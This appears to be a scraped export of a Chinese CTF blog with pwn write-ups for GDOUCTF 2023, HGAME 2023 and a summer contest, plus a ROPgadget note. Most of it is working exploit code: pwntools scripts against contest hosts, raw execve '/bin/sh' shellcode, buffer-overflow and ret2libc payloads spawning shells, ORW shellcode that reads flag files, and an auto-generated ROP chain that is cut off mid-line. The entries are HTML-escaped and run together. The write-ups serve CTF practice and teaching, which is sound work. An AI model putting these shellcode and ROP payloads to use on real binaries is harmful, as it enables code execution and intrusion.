printf(&quot;\\x1B[0m&quot;);      return 0;    &#125;    system(&quot;clear&quot;);  puts(&quot;Congratulation!&quot;);  cat_flag();  \n已知种子随机数种子有三种情况：0 - 15221274701 - 15221274702 - 1522127470\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;        int b;        //srand(0 - 1522127470);        srand(1 - 1522127470);        //srand(2 - 1522127470);//三选一，不行多跑几次        for (int i = 1; i &lt;=120; i++)&#123;                b = rand() % 4 + 1;                printf(&quot;\\&#x27;%d\\&#x27;,&quot;, b);        &#125;        return 0;&#125;\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)io = remote(&#x27;node5.anna.nssctf.cn&#x27;,28310)s = [&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,]for i in range(120):  io.recv()   io.sendline(str(s[i]))  io.recv()io.recv()io.recv()\n靶机随机数生成可能不一样，多试几次[GDOUCTF 2023]小学数学\nimport randomimport signaldef ran():    return random.randint(999,99999)def add():    question = f&quot;&#123;ran()&#125; + &#123;ran()&#125; = &quot;    print(question.replace(&#x27;+&#x27;,&#x27;-&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def sub():    question = f&quot;&#123;ran()&#125; - &#123;ran()&#125; = &quot;    print(question.replace(&#x27;-&#x27;,&#x27;x&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def mul():    question = f&quot;&#123;ran()&#125; x &#123;ran()&#125; = &quot;    print(question.replace(&#x27;x&#x27;,&#x27;//&#x27;))    answer = eval(question[:-2].replace(&#x27;x&#x27;,&#x27;*&#x27;))        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def div():    question = f&quot;&#123;ran()&#125; // &#123;ran()&#125; = &quot;    print(question.replace(&#x27;//&#x27;,&#x27;%&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def mod():    question = f&quot;&#123;ran()&#125; % &#123;ran()&#125; = &quot;    print(question.replace(&#x27;%&#x27;,&#x27;+&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)print(&quot;  ____ ____   ___  _   _    ____ _____ _____ &quot;)print(&quot; / ___|  _ \\ / _ \\| | | |  / ___|_   _|  ___|&quot;)print(&quot;| |  _| | | | | | | | | | | |     | | | |_   &quot;)print(&quot;| |_| | |_| | |_| | |_| | | |___  | | |  _|  &quot;)print(&quot; \\____|____/ \\___/ \\___/   \\____| |_| |_|    &quot;)print(&quot;\t\t\t\t\t\t\t\t\t\t\t\t&quot;)print(&quot;Welcome to the calculate challenge. Please try to solve 300 Question in 600 seconds.&quot;)print(&quot;ATTENTION: This is an April Fool&#x27;s game, and the real problem may not be what it seems&quot;)print(&quot;&quot;)input(&quot;Press Enter to start...&quot;)signal.alarm(600)for i in range(300):    print(&quot;Round: &quot;+str(i+1))    random.choice([add,sub,mul,div,mod])()flag = open(&#x27;/flag&#x27;).read()print(&quot;Congratulations on passing the challenge. This is your flag: &quot; + str(flag))\n\nfrom pwn import *context.log_level = &#x27;debug&#x27;p = remote(&#x27;node2.anna.nssctf.cn&#x27;,29000)io.sendline(b&#x27;&#x27;)print(&#x27;plz wait..&#x27;)for i in range(300):    io.recvuntil(str(i+1).encode())    num1 = int(io.recvuntil(b&#x27; &#x27;))    op = io.recvuntil(b&#x27; &#x27;)    num2 = int(io.recvuntil(b&#x27; &#x27;))    print(num1, op[0], num2)    if(op[0] == ord(&#x27;-&#x27;)):        io.sendline(str(num1+num2).encode())    elif(op[0] == ord(&#x27;x&#x27;)):        io.sendline(str(num1-num2).encode())    elif(op[0] == ord(&#x27;/&#x27;)):        io.sendline(str(num1*num2).encode())    elif(op[0] == ord(&#x27;%&#x27;)):        io.sendline(str(num1//num2).encode())    else:        io.sendline(str(num1%num2).encode())io.interactive()\n\n\n[GDOUCTF 2023]奇怪的ELFLinux1直接运行就行Linux2是arm架构下编译的，走逆向\n.data:0000000000003A60                               ; char flag[17].data:0000000000003A60 F2 EE E3 D9 CA EF E8 F3 FE D9+flag DCB 0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9, 0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB\nflag =[0xCE, 0xDC, 0xC5, 0xD2, 0xC0, 0xFD, 0xF1, 0xE3, 0xEA, 0xE5, 0xE9, 0xEB, 0xE3, 0xD9, 0xF2, 0xE9, 0xD9,  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,   0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB] #flag1+flag2for i in flag:    print(chr(i^0x86),end=&#x27;&#x27;)```    **[GDOUCTF 2023]EASY PWN**```cint check()&#123;  int result; // eax  char buf[10]; // [rsp+7h] [rbp-29h] BYREF  char s1[15]; // [rsp+11h] [rbp-1Fh] BYREF  ssize_t v3; // [rsp+20h] [rbp-10h]  int fd; // [rsp+28h] [rbp-8h]  int v5; // [rsp+2Ch] [rbp-4h]  v5 = 0;  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &lt; 0 )  &#123;    puts(&quot;Can&#x27;t access /dev/urandom.&quot;);    exit(1);  &#125;  v3 = read(fd, buf, 0xAuLL);  if ( v3 &lt; 0 )  &#123;    puts(&quot;Data not received from /dev/urandom&quot;);    exit(1);  &#125;  close(fd);  puts(&quot;Password:&quot;);  gets(s1);  result = strcmp(s1, buf);  if ( result )    result = puts(&quot;I swore that was the right password ...&quot;);  else    v5 = 1;  if ( v5 )  &#123;    puts(&quot;Guess I couldn&#x27;t gaslight you!&quot;);    return print_flag();  &#125;  return result;&#125;\n把v5覆盖成不为0的值即可[GDOUCTF 2023]Shellcode\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  setbuf(stdout, 0LL);  mprotect((void *)((unsigned __int64)&amp;stdout &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);  puts(&quot;Please.&quot;);  read(0, &amp;name, 0x25uLL);  puts(&quot;Nice to meet you.&quot;);  puts(&quot;Let&#x27;s start!&quot;);  read(0, buf, 0x40uLL);  return 0;&#125;\n可以看到第一个read可以把输入的东西直接写入.bss段，第二个read存在明显的栈溢出，所以思路很明确，第一次输入将shellcode写在.bss段上，再用第二次输入溢出后跳到.bss段执行shellcode。唯一坑：shellcode有长度限制\nfrom pwn import *import sgtlibcelf=ELF(&#x27;./shellcode&#x27;)pop_rdi_addr = 0x4007b3ret_addr = 0x4007ADmain_addr = 0x400687puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]bss_addr = 0x6010a0context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node2.anna.nssctf.cn&#x27;,28500)#wrongpayload1 = asm(shellcraft())payload1=&quot;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x31\\xF6\\x31\\xD2\\x6A\\x3B\\x58\\x0F\\x05&quot;p.sendlineafter(&quot;Please.\\n&quot;,payload1)payload2 =  b&#x27;a&#x27;*(0xa+8)+p64(bss_addr) p.sendlineafter(&#x27;start!\\n&#x27;,payload2)p.interactive()\n贴两个传送门：https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode &#x2F;&#x2F;art of the shellcode            https://defuse.ca/online-x86-assembler.htm#disassembly  &#x2F;&#x2F;编译shellcode的网站\n[GDOUCTF 2023]Random开了沙盒\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n0x60100到0x60200这段内存可读可写可执行，所以尝试把shellcode写入这段后将执行流劫持到该段haha函数内存在jmp rsp指令\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;# 连接远程p = remote(&quot;node6.anna.nssctf.cn&quot;,28969)# 加载rand函数的所在函数库libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))#设置srand函数jmp_sp = 0x40094Edata_addr = 0x601000#通过随机数验证  程序会跳转到vulnerable函数p.sendlineafter(&quot;num:&quot;,str(libc.rand()%50))&quot;&quot;&quot;利用 jmp_sp + asm 的攻击方式  让sp指针跳回变量地址 执行shellcode:     在data_addr 0x601000 写入orw_shellcode后    并跳转执行data_addr 0x12300的orw_shellcode&quot;&quot;&quot;payload=asm(shellcraft.read(0,data_addr,0x100))#调用read函数 在data_addr 0x601000处写入 orw_shellcode内容payload+=asm(&#x27;mov rax,0x601000;call rax&#x27;)#并且call ax寄存器 调用执行 data_addr 0x601000处的orw_shellcodepayload=payload.ljust(0x28,b&#x27;\\x00&#x27;)#打满变量空间 和 rbp寄存器的字节payload+=p64(jmp_sp)#返回地址写成jmp_esp，继续运行当前sp后续指令 填写别的返回地址 就无法控制程序后面的执行流程了payload+=asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)#此时sp已经离shellcode地址偏移0x30,这里把sp挪回到shellcode地址 并跳转到shellcodep.sendlineafter(&quot;your door\\n&quot;,payload)&quot;&quot;&quot;orw_shellcode执行的内容:打开本地的flag文件 把flag文件内容写入到 data_addr+0x100把输出data_addr+0x100的flag文件内容&quot;&quot;&quot;orw_shellcode = shellcraft.open(&quot;./flag&quot;)#打开本地的flag文件orw_shellcode += shellcraft.read(3, data_addr+0x100, 0x50)#文件描述符3:其它打开的文件 flag内容写入到data_addr+0x100orw_shellcode += shellcraft.write(1, data_addr+0x100,0x50)#文件描述符1:输出  地址data_addr+0x100存储的flag内容p.send(asm(orw_shellcode))p.interactive()","tags":["wp"]},{"title":"拿不到shell的shellcode","url":"/2023/08/01/%E6%8B%BF%E4%B8%8D%E5%88%B0shell%E7%9A%84shellcode/","content":"The arts of shellcode山海关巨佬的博客：https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode/1. [HGAME 2023 week1]simple_shellcodechecksec：\n[*] &#x27;/var/run/vmblock-fuse/blockdir/4JPOf1/vuln&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nsandbox:    \nroot@ubuntu:/home/str1k3/Desktop# seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/U0Wns2/vuln&#x27; line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000000  A = sys_number 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0004: 0x06 0x00 0x00 0x00000000  return KILL\n保护全开，沙盒禁用了system，考虑orw\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init();  mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);  puts(&quot;Please input your shellcode:&quot;);  read(0, (void *)0xCAFE0000LL, 0x10uLL);  sandbox();  MEMORY[0xCAFE0000]();  return 0;&#125;\n动调看到有一段权限都有的地址，可供写入shellcode。0x10的长度不够，所以我们要手搓shellcode来call一个read，以此写入orw的shellcode。\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA             Start                End Perm     Size Offset File        0xcafe0000         0xcafe1000 rwxp     1000      0 /dev/zero (deleted) ***    0x555555554000     0x555555555000 r--p     1000      0 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555555000     0x555555556000 r-xp     1000   1000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555556000     0x555555557000 r--p     1000   2000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555557000     0x555555558000 r--p     1000   2000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555558000     0x555555559000 rw-p     1000   3000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x7ffff7dc4000     0x7ffff7de6000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7de6000     0x7ffff7f5e000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7f5e000     0x7ffff7fac000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fac000     0x7ffff7fb0000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fb0000     0x7ffff7fb2000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fb2000     0x7ffff7fb8000 rw-p     6000      0 [anon_7ffff7fb2]    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]\n把断点下到执行shellcode前的地方看看寄存器\n RAX  0x0 RBX  0x5555555553d0 (__libc_csu_init) ◂— endbr64  RCX  0x7ffff7ee3d3e (prctl+14) ◂— cmp rax, -0xfff RDX  0xcafe0000 ◂— xor dword ptr [rcx], esi /* 0xa343135343131; &#x27;114514\\n&#x27; */ RDI  0x16 RSI  0x2 R8   0x0 R9   0x0 R10  0x7ffff7ee3d3e (prctl+14) ◂— cmp rax, -0xfff R11  0x217 R12  0x555555555100 (_start) ◂— endbr64  R13  0x7fffffffe3f0 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffe300 ◂— 0x0 RSP  0x7fffffffe2f0 —▸ 0x7fffffffe3f0 ◂— 0x1*RIP  0x5555555553b9 (main+131) ◂— call rdx\nread(0,0xcafe0000+x（地址）,0x1000(长度))在系统调用中就是rax=0,rdi=0,rsi = 0xcafe0000+x（地址）rdx=0x1000(长度)那么我们对照上面的寄存器地址就可以构造第一个payload首先rax=0 不用改变，先把rdi变成0 然后再把rsi=0xCAFE0010,rdx本身就够大了 也不用改变shellcode=asm(&quot;&quot;&quot; mov rdi,rax mov rsi,0xCAFE0010 syscall nop &quot;&quot;&quot;) 或 看read的汇编   0x55555555538b &lt;main+85&gt;     mov    rax, qword ptr [rbp - 8]   0x55555555538f &lt;main+89&gt;     mov    edx, 0x10   0x555555555394 &lt;main+94&gt;     mov    rsi, rax   0x555555555397 &lt;main+97&gt;     mov    edi, 0   0x55555555539c &lt;main+102&gt;    mov    eax, 0   0x5555555553a1 &lt;main+107&gt;    call   read@plt                &lt;read@plt&gt;把eax和edi清零，把edx变得足够大，把esi改成要写入的位置，也可以达到同样的调用效果      shellcode1 = asm(&quot;&quot;&quot; xor eax, eax /* SYS_read */ xor edi, edi /* 0 */ mov edx, 0x1000 mov esi, 0xcafe0000 syscall &quot;&quot;&quot;)调用完read之后找一段orw的shellcode输进去即可shellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)  或利用shellcraftshellcode2 = b&quot;\\x90&quot; * 0x100   #？？？#shellcode2 += asm(shellcraft.open(&quot;/flag&quot;))shellcode2 += asm(shellcraft.read(3, 0xCAFE0500, 0x500))shellcode2 += asm(shellcraft.write(1, 0xCAFE0500, 0x500))\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#p=process(&#x27;./vuln&#x27;)p=remote(&#x27;node2.anna.nssctf.cn&#x27;,28311)shellcode1=asm(&#x27;&#x27;&#x27; mov rdi,rax; mov rsi,0xCAFE0010; syscall; nop; &#x27;&#x27;&#x27;)p.sendafter(&quot;Please input your shellcode:\\n&quot;,shellcode1)shellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)p.send(shellcode2)print(p.recv())print(p.recv())\n\n2. [GDOUCTF 2023]Random开了沙盒\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n0x60100到0x60200这段内存可读可写可执行，所以尝试把shellcode写入这段后将执行流劫持到该段haha函数内存在jmp rsp指令\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;# 连接远程p = remote(&quot;node6.anna.nssctf.cn&quot;,28969)# 加载rand函数的所在函数库libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))#设置srand函数jmp_sp = 0x40094Edata_addr = 0x601000#通过随机数验证  程序会跳转到vulnerable函数p.sendlineafter(&quot;num:&quot;,str(libc.rand()%50))&quot;&quot;&quot;利用 jmp_sp + asm 的攻击方式  让sp指针跳回变量地址 执行shellcode:     在data_addr 0x601000 写入orw_shellcode后    并跳转执行data_addr 0x12300的orw_shellcode&quot;&quot;&quot;payload=asm(shellcraft.read(0,data_addr,0x100))#调用read函数 在data_addr 0x601000处写入 orw_shellcode内容payload+=asm(&#x27;mov rax,0x601000;call rax&#x27;)#并且call ax寄存器 调用执行 data_addr 0x601000处的orw_shellcodepayload=payload.ljust(0x28,b&#x27;\\x00&#x27;)#打满变量空间 和 rbp寄存器的字节payload+=p64(jmp_sp)#返回地址写成jmp_esp，继续运行当前sp后续指令 填写别的返回地址 就无法控制程序后面的执行流程了payload+=asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)#此时sp已经离shellcode地址偏移0x30,这里把sp挪回到shellcode地址 并跳转到shellcodep.sendlineafter(&quot;your door\\n&quot;,payload)&quot;&quot;&quot;orw_shellcode执行的内容:打开本地的flag文件 把flag文件内容写入到 data_addr+0x100把输出data_addr+0x100的flag文件内容&quot;&quot;&quot;orw_shellcode = shellcraft.open(&quot;./flag&quot;)#打开本地的flag文件orw_shellcode += shellcraft.read(3, data_addr+0x100, 0x50)#文件描述符3:其它打开的文件 flag内容写入到data_addr+0x100orw_shellcode += shellcraft.write(1, data_addr+0x100,0x50)#文件描述符1:输出  地址data_addr+0x100存储的flag内容p.send(asm(orw_shellcode))p.interactive()","tags":["shellcode"]},{"title":"山石安研院2023CTF夏令营_pwn","url":"/2023/08/19/HSNCTF-2023-summer/","content":"两道题都用ret2libc了，最后一道heap0解ret2syscall\nfrom pwn import*from LibcSearcher import *elf=ELF(&#x27;./pwn&#x27;)p = remote(&#x27;58.240.236.231&#x27;,49003)pop_rdi_ret = 0x40072bret_addr = 0x400509main_addr = 0x4006c7syscall = 0x400741puts_plt = 0x400520puts_got = 0x601018payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8 + p64(ret_addr)+ p64(pop_rdi_ret) + p64(0x601048) + p64(system_addr)p.sendline(payload)p.interactive()\n\nret2libc\nfrom pwn import*import sgtlibcelf=ELF(&#x27;./pwn&#x27;)p = remote(&#x27;58.240.236.231&#x27;,49002)libc =ELF(&#x27;libc-2.23.so&#x27;)pop_rdi_ret = 0x400783ret_addr = 0x400509main_addr = 0x4006FDputs_plt = 0x400520puts_got = 0x601018bss = 0x601060payload1 = b&#x27;a&#x27;*208+b&#x27;b&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload1)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=3) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload2 = b&#x27;a&#x27;*208+b&#x27;b&#x27;*8 + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)p.sendlineafter(&quot;name:&quot;,payload2)p.interactive()#LibcSearcher 扫出来的死都不对，气煞我也！\n","tags":["wp"]},{"title":"ROPgadget","url":"/2023/08/10/ROPgadget/","content":"安装\nsudo apt-get install python-capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo -H python3 setup.py install\n一般使用\n┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop]└─$ ROPgadget --binary &lt;file &gt; |grep &quot;&lt;gadget&gt;&quot;\n\n特殊情况给出一例题[CISCN 2019华南]PWN8\n┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop/nssctf/[CISCN 2019华南]PWN8]└─$ python exp.py[+] Starting local process &#x27;./pwn&#x27;: pid 221[DEBUG] &#x27;/[CISCN 2019华南]PWN8/pwn&#x27; is statically linked, skipping GOT/PLT symbols[*] &#x27;/[CISCN 2019华南]PWN8/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nROPgadget --binary pwn --ropchain\n面对静态链接的题，ROPgadget可以自动生成rop链\n#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x000000000044c156) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += 